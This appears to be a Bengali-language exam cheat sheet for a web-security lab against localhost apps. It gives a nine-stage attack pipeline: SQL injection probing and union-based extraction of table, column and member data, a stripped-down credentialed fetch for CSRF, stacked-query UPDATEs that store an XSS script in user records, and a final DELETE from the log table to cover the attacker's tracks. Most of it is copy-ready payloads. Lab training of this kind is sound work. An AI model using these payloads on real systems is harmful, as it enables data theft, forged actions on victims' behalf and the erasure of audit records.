### 🔰 স্টেজ ০: প্রস্তুতি (একবার করে করে নাও)
- ব্রাউজারে ২টা ট্যাব খোলা রাখো: 
  - **ট্যাব ১**: অ্যাপ-১ (যেখানে SQL ইনজেকশন দিবে, যেমন Fines/Gym/Registration)
  - **ট্যাব ২**: অ্যাপ-২ (যেখানে CSRF করে পোস্ট করবে, যেমন Marketplace/Chat/Forum)
- অ্যাটাকার অ্যাকাউন্ট দিয়ে দুই জায়গায় লগইন করে রাখো।

---

### 🧪 স্টেজ ১: ইনজেক্টেবল ফিল্ড কনফার্ম করা
**(কোথায় বসাবেন:** অ্যাপ-১-এর পিন/পাসওয়ার্ড ফিল্ডে)

```sql
' and '1'='1
```
✅ **রেজাল্ট:** লগইন সফল (ডাটা দেখায়)।

```sql
' and '1'='0
```
❌ **রেজাল্ট:** লগইন ফেইল (কোনো ডাটা দেখায় না)।

👉 **সিদ্ধান্ত:** এই ফিল্ডে ইনজেকশন করা যাবে।

---

### 🔢 স্টেজ ২: কয়টা কলাম আছে বের করা (Column Count)
**(কোথায় বসাবেন:** ওই একই পিন ফিল্ডে)

```sql
' order by 1 -- -
' order by 2 -- -
' order by 3 -- -
' order by 4 -- -
' order by 5 -- -
' order by 6 -- -
```
**যতক্ষণ কাজ করবে, বাড়াতে থাকো।** 
যেমন: ৫ পর্যন্ত কাজ করলো, ৬-এ ব্রেক করলো। 
👉 **কাজের কলাম সংখ্যা = ৫।**

---

### 👁️ স্টেজ ৩: কোন কলাম পেজে দেখায় (Visible Columns)
**(কোথায় বসাবেন:** পিন ফিল্ডে)

```sql
' union select 1,2,3,4,5 -- -
```
**পেজে যা দেখাবে:**
- নামের ঘরে যদি `2 3` দেখায় → মানে কলাম ২ ও ৩ দেখায়।
- ব্যালেন্সের ঘরে যদি `5` দেখায় → মানে কলাম ৫ দেখায়।
👉 **আমরা কাজ করবো কলাম ২, ৩ আর ৫ নিয়ে।** (১ আর ৪ অদৃশ্য)

---

### 🗄️ স্টেজ ৪: ডাটাবেস, টেবিল, কলামের নাম বের করা (Metadata)
**(কোথায় বসাবেন:** পিন ফিল্ডে)

**ক. ডাটাবেসের নাম:**
```sql
' union select 1, database(), 3, 4, 5 -- -
```

**খ. সব টেবিলের নাম (মনে রাখবে: `group_concat` ব্যবহার করবি):**
```sql
' union select 1, group_concat(table_name), 3, 4, 5 from information_schema.tables where table_schema=database() -- -
```
👉 আউটপুটে `member, fine_record` বা `registration, log` এরকম আসবে।

**গ. টার্গেট টেবিলের কলাম নাম (যেমন `member` টেবিলের জন্য):**
```sql
' union select 1, group_concat(column_name), 3, 4, 5 from information_schema.columns where table_name='member' -- -
```
👉 আউটপুটে `id, first_name, last_name, balance` ইত্যাদি আসবে।

---

### 📊 স্টেজ ৫: ডাটা এক্সট্র্যাক্ট করা (Task 1 সমাধান)

**কেস ১: সহজ টেবিল (C1 বা B1-এর মতো, শুধু `SELECT * FROM main_table`)**
```sql
' union select 1, group_concat(id, ' ', name, ': ', balance, '<br>'), 3, 4, 5 from member -- -
```

**কেস ২: জটিল টেবিল (A1-এর মতো, `JOIN` + `SUM` + যাদের ০ ফাইন তাদেরও দেখাতে হবে)**
**(এটাই মনে রাখার জন্য বেস্ট টেমপ্লেট):**
```sql
' union select 
    1, 
    group_concat(
        m.id, ' ', m.first_name, ' ', m.last_name, ': $', 
        IFNULL(SUM(f.amount), 0), 
        '<br>'
    ), 
    3, 4, 5
from member m 
left join fine_record f on m.id = f.member_id and f.status = 'UNPAID'
group by m.id -- -
```
> **খেয়াল করো:** `IFNULL` ব্যবহার করেছি, যাতে যাদের কোনো ফাইন নেই তারা ০ দেখায়। আর `LEFT JOIN` ব্যবহার করেছি, যাতে যাদের কোনো রেকর্ড নেই তারাও আসে।

---

### 🕸️ স্টেজ ৬: CSRF-এর জন্য "Barebone Fetch" বানানো (সবচেয়ে গুরুত্বপূর্ণ পরিবর্তন)

**ডিফল্ট "Copy as fetch" (যা কাজ করে না কারণ প্রিফ্লাইট হয়):**
ব্রাউজারের নেটওয়ার্ক ট্যাব থেকে কপি করলে অনেক হেডার থাকে (User-Agent, Accept, ইত্যাদি)।

**🔧 এটাকে "Barebone Fetch"-এ পরিবর্তন করতে হবে (শুধু এই ৩টা জিনিস রাখো):**
```js
fetch("http://localhost:4001/list", {
    method: "POST",
    credentials: "include",        // কুকি পাঠানোর জন্য
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "title=hello&price=100"
});
```
> **মনে রাখবে:** বাকি সব হেডার মুছে ফেলতে হবে, নাহলে CORS প্রিফ্লাইট ব্লক করে দেবে।

---

### 💉 স্টেজ ৭: স্টোরেড XSS পেলোড (টার্গেট টেবিলে UPDATE করা)

এখন এই "Barebone Fetch"-কে `<script>` ট্যাগের ভিতরে ঢুকিয়ে, SQL `UPDATE` দিয়ে ডাটাবেসে বসাতে হবে।

**টেমপ্লেট (কপি করে শুধু আইডি আর ভ্যালু চেইঞ্জ করো):**
```sql
আপনার_পিন'; UPDATE member SET last_name = CONCAT(
    '<script>
        fetch("http://localhost:4001/list", {
            method: "POST",
            credentials: "include",
            headers: {"Content-Type": "application/x-www-form-urlencoded"},
            body: "title=I+owe+', 
            (SELECT SUM(amount) FROM fine_record WHERE member_id = m.member_id AND status = 'UNPAID'), 
            '+in+fines&price=', 
            (SELECT SUM(amount) FROM fine_record WHERE member_id = m.member_id AND status = 'UNPAID'), 
            '"
        });
    </script>'
) WHERE id = 4100001; -- -
```
**খেয়াল করো:** 
- উপরের পেলোডে **সাবকোয়েরি** ব্যবহার করেছি, যা ডায়নামিকভাবে ইউজারের নিজের ফাইন ক্যালকুলেট করে বসিয়ে দিচ্ছে। (A1-এর জন্য এইটাই দরকার)।
- যদি সাবকোয়েরি না লাগে (শুধু স্ট্যাটিক টেক্সট পোস্ট করতে হয়, যেমন C1), তাহলে `body: "message=hello"` লিখলেই হয়। 

---

### 🚀 স্টেজ ৮: ট্রিগার করা (পেলোড রান করানো)

পেলোড আপডেট করার পর, **অ্যাপ-১** (যেমন Fines/Gym পোর্টাল) এ গিয়ে তোমার (অথবা ভিকটিমের) রেজাল্ট/প্রোফাইল চেক করো। 
**পেজ লোড হওয়ার সাথে সাথে স্টোর করা স্ক্রিপ্ট রান করবে**, এবং অ্যাপ-২-এ CSRF রিকোয়েস্ট চলে যাবে।

**ভেরিফিকেশন:** অ্যাপ-২ রিলোড দাও। দেখবে নতুন পোস্ট/লিস্টিং চলে এসেছে। (C1-এর ক্ষেত্রে টাইটেল চেইঞ্জ হবে)।

---

### 🧹 স্টেজ ৯: বোনাস - লগ ডিলিট করা (Cover your tracks)

**(কোথায় বসাবেন:** পিন ফিল্ডে)

```sql
আপনার_পিন'; DELETE FROM log WHERE submitted_id = 'আপনার_আইডি'; -- -
```
👉 এটা শুধু তোমার অ্যাটাক রেকর্ড ডিলিট করবে। বাকিদের লগ থাকবে।

---

### 🔥 পরীক্ষার সময় ২টি "গুরুত্বপূর্ণ এডিট" (যা কনফিউশন তৈরি করে):

1. **C1-এর মতো সরাসরি টাইটেল চেইঞ্জ করতে (ডাবল কোট ব্যবহার করো):**
```js
body: "message=<script>document.title=\"C1-SECOND-ORDER-XSS\"<\/script>"
```
এখানে সিঙ্গেল কোটের বদলে ডাবল কোট (`\"`) ব্যবহার করেছি, যাতে SQL-এর সিঙ্গেল কোটের সাথে কনফ্লিক্ট না হয়।

2. **B1-এর মতো ডাবল এনকোডিং দরকার হলে (JS কনসোল দিয়ে বানাও):**
```js
let payload = "<script>document.title=\"B1-REFLECTED-XSS\"</script>";
let link = "http://localhost:5001/search?q=" + encodeURIComponent(payload);
console.log(encodeURIComponent(link)); // এই আউটপুটটা কপি করে body তে বসাও।
```

---

### 📌 শেষ কথা (কি কী ভুলবে না)
| **কাজ** | **কোথায় বসাবি** | **কী চেইঞ্জ করবি?** |
| :--- | :--- | :--- |
| ইনজেকশন টেস্ট | পিন ফিল্ড | `' and '1'='1` বনাম `'0` |
| ইউনিয়ন | পিন ফিল্ড | `ORDER BY` দিয়ে কলাম কাউন্ট |
| ডাটা এক্সট্র্যাক্ট | পিন ফিল্ড | `GROUP_CONCAT` আর `LEFT JOIN` ব্যবহার করবি |
| ফেচ (CSRF) | ব্রাউজার কনসোল/পেলোড | সব হেডার বাদ দিয়ে শুধু `Content-Type` আর `credentials:include` রাখবি |
| আপডেট (XSS) | পিন ফিল্ড | `UPDATE ... SET last_name = '<script>...'` |
| লগ ডিলিট | পিন ফিল্ড | `DELETE FROM log WHERE submitted_id=...` |

এই পাইপলাইনটা তোর সামনে রেখে দে। পরীক্ষায় নতুন নাম, নতুন কলাম এলেও, **এই ৯টা স্টেপ মাথায় রেখে** শুধু টেবিলের নাম আর কলামের নাম বদলালেই কাজ হয়ে যাবে ইনশাআল্লাহ! 💪